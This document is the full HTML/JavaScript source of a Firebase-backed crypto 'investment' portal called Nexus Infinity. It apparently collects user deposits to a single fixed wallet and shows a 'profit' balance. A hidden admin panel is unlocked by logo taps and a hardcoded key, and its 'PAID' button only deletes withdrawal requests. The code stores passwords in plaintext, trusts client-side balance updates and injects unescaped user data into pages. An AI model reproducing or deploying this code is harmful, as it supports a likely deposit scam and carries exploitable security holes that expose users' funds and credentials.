<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Ultimate Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --gold: #f3ba2f; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #fff; color: #0f172a; margin: 0; }

        .glass-card { background: #fff; border: 1px solid rgba(0,0,0,0.05); border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.01); }
        .input-pro { background: #f8fafc; border: 2px solid transparent; border-radius: 18px; padding: 16px; width: 100%; font-weight: 700; outline: none; }
        .btn-gold { background: linear-gradient(135deg, #f3ba2f 0%, #ffdb4d 100%); color: #000; font-weight: 900; padding: 18px; border-radius: 20px; width: 100%; text-transform: uppercase; border: none; cursor: pointer; }
        
        .nav-item { cursor: pointer; font-size: 10px; font-weight: 800; color: #94a3b8; text-align: center; }
        .nav-item.active { color: #000; }
        .hidden { display: none !important; }

        /* Admin UI */
        #admin-panel { position: fixed; inset: 0; background: #f1f5f9; z-index: 5000; overflow-y: auto; padding: 20px; }
        .admin-card { background: white; border-radius: 20px; padding: 15px; margin-bottom: 15px; border-left: 5px solid #000; }
        .badge-pending { background: #fef9c3; color: #a16207; padding: 2px 8px; border-radius: 5px; font-size: 9px; font-weight: 800; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-16 h-16 bg-white text-black rounded-2xl flex items-center justify-center text-3xl font-black mb-4">N</div>
        <h1 class="text-white font-black italic text-xl uppercase tracking-widest">Nexus<span class="text-[#f3ba2f]">Infinity</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 hidden">
        <div class="w-full max-w-sm space-y-10">
            <div id="logo-tap-target" class="w-20 h-20 bg-black text-white rounded-[2.5rem] mx-auto flex items-center justify-center text-4xl font-black mb-6 shadow-2xl cursor-pointer">N</div>
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Username" class="input-pro text-center">
                <input type="password" id="l-pass" placeholder="Password" class="input-pro text-center">
                <button onclick="handleLogin()" class="btn-gold w-full">Authorize</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] font-black text-slate-400 uppercase cursor-pointer">Register Identity</p>
            </div>
            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="New Username" class="input-pro text-center">
                <input type="password" id="s-pass" placeholder="New Password" class="input-pro text-center">
                <button onclick="handleSignup()" class="btn-gold w-full">Create ID</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] font-black text-slate-400 uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-28">
        <nav class="sticky top-0 bg-white/80 backdrop-blur-xl border-b p-5 flex justify-between items-center z-[500]">
            <div class="flex items-center gap-2">
                <div id="admin-trigger" class="w-8 h-8 bg-black text-white rounded-lg flex items-center justify-center font-black text-xs cursor-pointer">N</div>
                <span id="nav-user" class="font-black italic uppercase text-sm">...</span>
            </div>
            <button onclick="logout()" class="text-slate-300"><i class="fa-solid fa-power-off"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-card p-10 bg-slate-900 text-white">
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-widest mb-2">Portfolio</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between">
                    <div><p class="text-[8px] font-black text-slate-500 uppercase">Profit</p><p id="profit-txt" class="text-lg font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] font-black text-slate-500 uppercase">Status</p><p class="text-xs font-black text-[#f3ba2f]">Verified Node</p></div>
                </div>
            </div>
            
            <div class="grid grid-cols-2 gap-4">
                <button onclick="switchPage('finance')" class="glass-card p-6 font-black uppercase text-[10px]"><i class="fa-solid fa-plus block mb-2 text-[#f3ba2f]"></i>Deposit</button>
                <button onclick="switchPage('finance')" class="glass-card p-6 font-black uppercase text-[10px]"><i class="fa-solid fa-minus block mb-2"></i>Withdraw</button>
            </div>
        </div>

        <div id="page-finance" class="p-6 space-y-6 hidden">
            <h3 class="font-black italic uppercase text-lg">Wallet</h3>
            <div class="glass-card p-6 space-y-4">
                <p class="text-[8px] font-black text-slate-400">SEND TO: TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                <input type="number" id="dep-amt" placeholder="Amount" class="input-pro">
                <input type="text" id="dep-tid" placeholder="TID / Hash" class="input-pro">
                <input type="file" id="dep-proof" accept="image/*" class="text-[10px]">
                <button onclick="submitDep()" class="btn-gold w-full">Confirm Deposit</button>
            </div>
            <div class="glass-card p-6 space-y-4">
                <input type="text" id="w-addr" placeholder="Wallet Address" class="input-pro">
                <input type="number" id="w-amt" placeholder="Withdraw Amount" class="input-pro">
                <button onclick="submitWith()" class="btn-gold w-full bg-slate-100">Request Payout</button>
            </div>
        </div>

        <div id="page-history" class="p-6 space-y-6 hidden">
            <h3 class="font-black italic uppercase text-lg">Ledger</h3>
            <div id="history-list" class="space-y-3"></div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-white border-t p-5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-house block text-lg mb-1"></i>Home</div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-wallet block text-lg mb-1"></i>Finance</div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-clock-rotate-left block text-lg mb-1"></i>History</div>
        </div>
    </div>

    <div id="admin-panel" class="hidden">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black italic uppercase">Master Control</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-2xl font-black">&times;</button>
        </div>
        
        <div class="space-y-6">
            <section>
                <h3 class="text-[10px] font-black uppercase text-slate-400 mb-4">Pending Deposits</h3>
                <div id="admin-dep-list" class="space-y-3"></div>
            </section>
            <section>
                <h3 class="text-[10px] font-black uppercase text-slate-400 mb-4">Pending Withdrawals</h3>
                <div id="admin-with-list" class="space-y-3"></div>
            </section>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // SECRET TAP LOGIC
        let tapCount = 0;
        document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap-target').onclick = () => {
            tapCount++;
            if(tapCount === 4) {
                const key = prompt("Enter Master Security Key:");
                if(key === "coin786") {
                    document.getElementById('admin-panel').classList.remove('hidden');
                    loadAdminData();
                }
                tapCount = 0;
            }
            setTimeout(() => tapCount = 0, 2000);
        };

        window.onload = () => {
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val();
                if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0);
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0);
                
                if(data.history) {
                    document.getElementById('history-list').innerHTML = Object.values(data.history).reverse().map(h => `
                        <div class="glass-card p-4 flex justify-between items-center">
                            <div><p class="text-[9px] font-black uppercase">${h.type}</p><p class="text-[7px] text-slate-400">${h.date}</p></div>
                            <div class="text-right"><p class="text-[10px] font-bold">$${h.amount}</p><span class="badge-pending">${h.status}</span></div>
                        </div>
                    `).join('');
                }
            });
        }

        // ADMIN FUNCTIONS
        async function loadAdminData() {
            onValue(ref(db, 'admin/deposits'), (snap) => {
                const data = snap.val();
                document.getElementById('admin-dep-list').innerHTML = data ? Object.entries(data).map(([id, d]) => `
                    <div class="admin-card">
                        <p class="text-[10px] font-black uppercase">User: ${d.user} | $${d.amount}</p>
                        <p class="text-[8px] text-slate-400 mb-2">TID: ${d.tid}</p>
                        <img src="${d.proof}" class="w-20 h-20 rounded mb-2 object-cover">
                        <div class="flex gap-2">
                            <button onclick="approveDep('${id}', '${d.user}', ${d.amount})" class="bg-green-500 text-white text-[8px] px-4 py-2 rounded">APPROVE</button>
                            <button onclick="rejectDep('${id}', '${d.user}')" class="bg-red-500 text-white text-[8px] px-4 py-2 rounded">REJECT</button>
                        </div>
                    </div>
                `).join('') : '<p class="text-xs text-center">Empty</p>';
            });

            onValue(ref(db, 'admin/withdrawals'), (snap) => {
                const data = snap.val();
                document.getElementById('admin-with-list').innerHTML = data ? Object.entries(data).map(([id, w]) => `
                    <div class="admin-card" style="border-color: red;">
                        <p class="text-[10px] font-black uppercase">User: ${w.user} | $${w.amount}</p>
                        <p class="text-[8px] text-slate-400 mb-2">Wallet: ${w.wallet}</p>
                        <div class="flex gap-2">
                            <button onclick="approveWith('${id}', '${w.user}', ${w.amount})" class="bg-green-500 text-white text-[8px] px-4 py-2 rounded">PAID</button>
                            <button onclick="rejectWith('${id}', '${w.user}')" class="bg-red-500 text-white text-[8px] px-4 py-2 rounded">REJECT</button>
                        </div>
                    </div>
                `).join('') : '<p class="text-xs text-center">Empty</p>';
            });
        }

        window.approveDep = async (id, user, amt) => {
            const uRef = ref(db, `users/${user}`);
            const uSnap = await get(uRef);
            const currentBal = uSnap.val().balance || 0;
            await update(uRef, { balance: currentBal + parseFloat(amt) });
            await remove(ref(db, `admin/deposits/${id}`));
            alert("Deposit Approved!");
        };

        window.rejectDep = async (id, user) => {
            await remove(ref(db, `admin/deposits/${id}`));
            alert("Deposit Rejected!");
        };

        window.approveWith = async (id, user, amt) => {
            await remove(ref(db, `admin/withdrawals/${id}`));
            alert("Withdrawal Marked as Paid!");
        };

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-proof').files[0];
            if(!amt || !tid || !file) return alert("Error!");
            const reader = new FileReader(); reader.readAsDataURL(file);
            reader.onload = async () => {
                const entry = { user, amount: amt, tid, proof: reader.result, status: 'pending', date: new Date().toLocaleString(), type: 'deposit' };
                const hRef = push(ref(db, `users/${user}/history`));
                await set(hRef, entry);
                await set(ref(db, `admin/deposits/${hRef.key}`), entry);
                alert("Request Sent!");
            };
        };

        window.submitWith = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('w-amt').value;
            const addr = document.getElementById('w-addr').value;
            const uRef = ref(db, `users/${user}`);
            const uSnap = await get(uRef);
            if(uSnap.val().balance < amt) return alert("No Balance!");
            await update(uRef, { balance: uSnap.val().balance - amt });
            const entry = { user, amount: amt, wallet: addr, status: 'pending', date: new Date().toLocaleString(), type: 'withdraw' };
            const hRef = push(ref(db, `users/${user}/history`));
            await set(hRef, entry);
            await set(ref(db, `admin/withdrawals/${hRef.key}`), entry);
            alert("Withdrawal Requested!");
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Empty!");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Ready!"); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Error!");
        };

        window.switchPage = (p) => {
            ['home', 'finance', 'history'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };

        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
